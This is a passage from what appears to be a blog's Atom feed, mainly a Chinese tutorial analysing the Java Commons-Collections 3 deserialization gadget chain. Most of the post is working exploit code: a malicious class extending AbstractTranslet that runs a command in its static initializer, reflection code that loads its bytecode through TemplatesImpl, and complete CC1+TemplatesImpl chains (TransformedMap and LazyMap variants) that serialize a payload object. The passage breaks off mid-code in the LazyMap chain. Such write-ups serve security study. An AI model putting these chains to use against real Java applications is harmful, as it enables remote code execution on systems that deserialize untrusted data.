3f102e0cb580061aca23dade2e4a6fc4df8c83dc24666defb316fb58de9595d981</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script><script data-swup-reload-script type="module">import {initHBE} from "/js/plugins/hbe.js";  console.log("hexo-blog-encrypt: loaded.");    initHBE();</script>]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-Commons-Collections 3利用链分析</title>
    <link href="http://example.com/2025/01/22/Java%E5%AE%89%E5%85%A8-Commons-Collections-3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/01/22/Java%E5%AE%89%E5%85%A8-Commons-Collections-3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2025-01-22T06:37:26.000Z</published>
    <updated>2025-01-25T16:14:58.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CC3同之前的CC1和CC6的区别非常大，CC1和CC6最终是通过<code>Runtime.exec()</code>来命令执行，但是如果禁用了<code>Runtime</code>呢？</p><p>而CC3则是通过<strong>动态加载类机制</strong>来实现自动执行恶意类代码。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>JDK8u65</li><li>Commons-Collections 3.2.1</li></ul><h1 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先来回顾一下<code>TemplatesImpl</code>加载字节码实现RCE。</p><p>类加载机制是Java虚拟机用于在运行时加载Java类文件并将其转换为可执行代码的过程。所以不管是远程加载class文件，还是本地的class文件或jar文件，Java虚拟机都会经过下面的过程：</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438332.png" alt="image-20250120154526689"></p><p>从前往后看，首先是<code>loadclass</code>，从<strong>已加载的类缓存、父加载器</strong>等位置寻找类，这里实际上就是双亲委派，没有找到的情况下执行<code>findclass</code></p><p>对于<code>findClass</code>方法</p><ul><li>根据名称或位置加载<code>.class</code>字节码，然后使用<code>defineClass</code></li><li>通常由子类实现</li></ul><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438336.png" alt="image-20250120160030850"></p><p><code>defineClass</code>的作用是处理前面传入的字节码，将其处理成真正的Java类</p><blockquote><p>此时的<code>defineClass()</code>方法是有局限性的，因为它只是加载类，而不是执行类，如果需要执行，则需要先进行<code>newInstance()</code>实例化</p></blockquote><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438318.png" alt="image-20250120161413108"></p><p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度</p><p>但是<code>defineClass()</code>方法的作用域为<code>protected</code>，我们需要找到作用域为<code>public</code>的类来利用</p><p>find usages，在<code>TemplatesImpl</code>类的<code>static class TranslateClassLoader</code>中找到了可以利用的类</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438060.png" alt="image-20250121141643051"></p><p>这里的<code>defineClass()</code>方法没有标注作用域，默认为<code>default</code>，也就是说自己的类里面可以调用，继续find usages</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438099.png" alt="image-20250121142017314" style="zoom:80%;"><p>作用域为<code>private</code>，继续找</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438070.png" alt="image-20250121142249460"></p><p>同一个类下的<code>getTransletInstance()</code>方法调用了<code>defineTransletClasses</code>，并且这里有一个<code>newInstance()</code>实例化的过程，如果能走完这个函数就能动态执行代码，因为作用域还是<code>private</code>，继续往下找</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438749.png" alt="image-20250121142625945"></p><p>终于找到了<code>public</code>，下面开始利用</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>前面说过只要走过<code>getTransletInstance()</code>即可，因为这里有个<code>newInstance()</code>，用伪代码表示如下</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">templates.newTransformer(); <span class="comment">//因为是一层层调用的，我们需要后续赋值</span></span><br></pre></td></tr></table></figure></div><p>但是注意这里的限制条件</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438742.png" alt="image-20250121143641063"></p><p>我们需要让<code>_name</code>不为null，并且<code>_class</code>为null才能往下调用<code>newInstance()</code></p><p>下面开始写Exp</p><p>首先就是要通过反射修改<code>TemplatesImpl</code>类的一些属性值</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438832.png" alt="image-20250121143951405"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438261.png" alt="image-20250121144456774"></p><p>上面说过，<code>_name</code>的值不为null，这里是String类型，我们随便赋个值就行</p><p><code>_class</code>的值为null，本来就是null，不用管它</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438013.png" alt="image-20250121144257300"></p><p>然后就是<code>_bytecodes</code>和<code>_tfactory</code></p><p><code>_bytecodes</code>定义的类型是二维数组，所以我们需要创建一个二维数组，但是<code>_bytecodes</code>传进<code>defineClass</code>方法的值是一个一维数组，这个一维数组里面存放我们的恶意字节码。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438036.png" alt="image-20250121145042602"></p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438382.png" alt="image-20250121145409818" style="zoom: 80%;"><p>我们来写个简单的PoC</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3PoC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>恶意类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>_tfactory</code>的值在<code>Templates</code>这一类中被定义如下，<code>transient</code>导致其被序列化后无法被访问</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438463.png" alt="image-20250121151802052"></p><p>直接修改不行，我们只需要让<code>_tfactory</code>不为null即可，看看<code>_tfactory</code>的其他定义</p><p>在<code>readObject</code>中，<code>_tfactory = new TransformerFactoryImpl()</code>，那我们只需要通过反射将其赋值为<code>TransformerFactoryImpl()</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438508.png" alt="image-20250122142907130"></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure></div><p>最终Exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, IOException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但是运行的时候空指针报错</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438607.png" alt="image-20250121152855094"></p><p>我们打个断点调试一下</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438652.png" alt="image-20250121153317143"></p><p>第418行，判断在<code>defineClass()</code>方法中传进去的参数b数组的字节码是否继承了*<code>ABSTRACT_TRANSLET</code><em>这个父类，没有则抛出异常，我们需要去恶意类中继承</em><code>ABSTRACT_TRANSLET</code>*这个父类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438920.png" alt="image-20250121154042465"></p><p>调用链：</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438943.png" alt="image-20250121162638146" style="zoom:67%;"><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><p>我们之前说过，在<code>getTransletInstance</code>方法的<code>_class[_transletIndex].newInstance()</code>实现了类的实例化。</p><p><code>Nbc</code>师傅在文章中提到一个问题，这里是在实例化谁初始化什么</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438936.png" alt="image-20250121163740056"></p><p>我们找到第405行的try，往下看，可以发现这里的<code>_class</code>就是一个数组，<code>defineClass</code>加载器加载完我们的恶意类字节码后，转换为类存储在<code>_class</code>中，然后进行类的初始化再执行</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438027.png" alt="image-20250121163355902" style="zoom:80%;"><h1 id="CC1-TemplatesImpl"><a href="#CC1-TemplatesImpl" class="headerlink" title="CC1+TemplatesImpl"></a>CC1+TemplatesImpl</h1><blockquote><p><code>TemplatesImpl</code>只是将原本的命令执行变成代码执行的方式，所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过<strong>动态加载字节码</strong>进行命令执行</p></blockquote><p>其实就是命令执行的方式变了，把<code>Runtime.exec()</code>换掉，将传参设置为动态加载字节码</p><h2 id="TransformMap版CC1"><a href="#TransformMap版CC1" class="headerlink" title="TransformMap版CC1"></a>TransformMap版CC1</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1TemplatesT</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//   chainedTransformer.transform(1);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438229.png" alt="image-20250121212218169"></p><h2 id="LazyMap版CC1"><a href="#LazyMap版CC1" class="headerlink" title="LazyMap版CC1"></a>LazyMap版CC1</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1TemplatesL</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> 